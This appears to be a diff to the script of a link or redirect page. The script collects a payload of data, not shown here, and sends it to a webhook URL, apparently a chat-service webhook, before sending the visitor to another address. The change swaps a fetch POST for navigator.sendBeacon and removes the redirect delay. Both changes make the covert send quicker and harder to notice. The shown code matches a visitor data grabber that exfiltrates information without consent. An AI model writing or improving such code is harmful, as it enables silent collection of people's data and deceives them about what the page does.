@@ -58,21 +58,15 @@
           }
         };
 if (WEBHOOK_URL.startsWith("http")) {
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
-    })
-  }).catch(() => {});
+  const blob = new Blob(
+    [JSON.stringify(payload)],
+    { type: "application/json" }
+  );
+  navigator.sendBeacon(WEBHOOK_URL, blob);
 }
-
-
       } catch (e) {
        }
-      setTimeout(() => {
-        window.location.replace(REDIRECT_URL);
-      }, 300);
+window.location.replace(REDIRECT_URL);
     }
 
     collectAndRedirect();
